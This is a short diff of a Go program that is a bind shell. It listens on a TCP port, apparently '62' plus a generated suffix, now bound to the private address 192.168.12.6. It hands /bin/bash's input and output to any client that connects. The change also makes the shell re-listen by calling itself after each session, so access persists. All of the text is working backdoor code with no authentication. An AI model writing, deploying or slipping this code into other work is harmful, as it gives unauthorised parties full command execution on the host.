@@ -9,10 +9,14 @@ import (
 	"time"
 )
 
-var host string = "0.0.0.0"
+var host string = "192.168.12.6"
 var port string
 
 func main() {
+	do()
+}
+
+func do() {
 	port = "62" + getPort(0, "")
 	fmt.Println("Listening on port " + port)
 	shell()
@@ -33,24 +37,22 @@ func random(n int) int {
 }
 
 func shell() {
-	for {
-		list, err := net.Listen("tcp", host+":"+port)
-		if err != nil {
-			fmt.Println(err.Error())
-			fmt.Println("first")
-		}
-		con, err := list.Accept()
-		if err != nil {
-			fmt.Println(err.Error())
-			fmt.Println("second")
-		}
-		cmd := exec.Command("/bin/bash")
-		//Set input/output to the established connection's in/out
-		cmd.Stdin = con
-		cmd.Stdout = con
-		cmd.Stderr = con
-		cmd.Run()
-		return
+	list, err := net.Listen("tcp", host+":"+port)
+	if err != nil {
+		fmt.Println(err.Error())
+		fmt.Println("first")
 	}
+	con, err := list.Accept()
+	if err != nil {
+		fmt.Println(err.Error())
+		fmt.Println("second")
+	}
+	cmd := exec.Command("/bin/bash")
+	//Set input/output to the established connection's in/out
+	cmd.Stdin = con
+	cmd.Stdout = con
+	cmd.Stderr = con
+	cmd.Run()
+	do()
 
 }
